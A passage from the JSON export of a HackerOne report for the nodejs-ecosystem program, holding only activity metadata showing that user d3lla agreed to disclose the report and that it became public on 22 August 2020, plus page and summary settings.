                    "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 9008029,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-08-22T08:48:20.119Z",
            "updated_at": "2020-08-22T08:48:20.119Z",
            "actor": {
                "username": "d3lla",
                "cleared": false,
                "verified": false,
                "url": "/d3lla",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 9008030,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ReportBecamePublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-08-22T08:48:20.160Z",
            "updated_at": "2020-08-22T08:48:20.160Z",
            "actor": {
                "username": "d3lla",
                "cleared": false,
                "verified": false,
                "url": "/d3lla",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        }
    ],
    "activity_page_count": 1,
    "activity_page_number": 1,
    "summaries": [
        {
            "category": "team",
            "can_view?": true,
            "can_create?": false
        },
        {
            "category": "researcher",
            "can_view?": true,
            "can_create?": false
        }
    ]
}